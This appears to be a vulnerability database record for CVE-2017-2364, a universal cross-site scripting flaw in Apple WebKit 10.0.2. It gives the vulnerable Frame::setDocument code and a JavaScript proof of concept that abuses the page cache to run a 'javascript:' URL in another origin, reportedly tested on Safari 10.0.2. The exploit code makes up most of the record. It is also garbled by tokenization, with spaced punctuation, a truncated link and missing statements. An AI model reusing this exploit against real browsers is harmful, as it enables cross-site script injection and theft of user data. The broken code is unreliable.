{
    "text": "vul_name : Apple WebKit 10.0.2 'Frame : setDocument ( 1 ) ' Universal Cross-Site Scripting ， vul_cve : CVE-2017-2364 ， vul_poc : < ! - ， void Frame : setDocument ( RefPtr<Document> newDocument )  ， { ， ASSERT (  ! newDocument | newDocument->frame (  ) = this )  ;  ， m_doc->prepareForDestruction (  )  ;  ， m_doc = newDocument.copyRef (  )  ;  ， . ， } ， The function | prepareForDestruction | only called when the cache state is not | Document : InPageCache | . So the frame will be never detached from the cached document. ， PoC :  ， -> ， \"use strict\" ;  ， document.write ( \"click anywhere to start\" )  ;  ， window.onclick = (  ) => { ， let w = open ( \"about : blank\" , \"one\" )  ;  ， let d = w.document ;  ， let a = d.createElement ( \"a\" )  ;  ， a.href = \" ， a.click (  )  ; - about : blank -> Document : InPageCache ， let it = setInterval (  ) => { ， w.location.href.toString ;  ， } catch ( e ) { ， clearInterval ( it )  ;  ， let s = d.createElement ( \"a\" )  ; - about : blank's document ， s.href = \"javascript : alert ( location ) \" ;  ， s.click (  )  ;  ， } ， } , 0 )  ;  ， } ;  ， < ! - ， Tested on Safari 10.0.2 ( 12602.3.12.0.1 ) . ， ->",
    "time": "2017.04.05"
}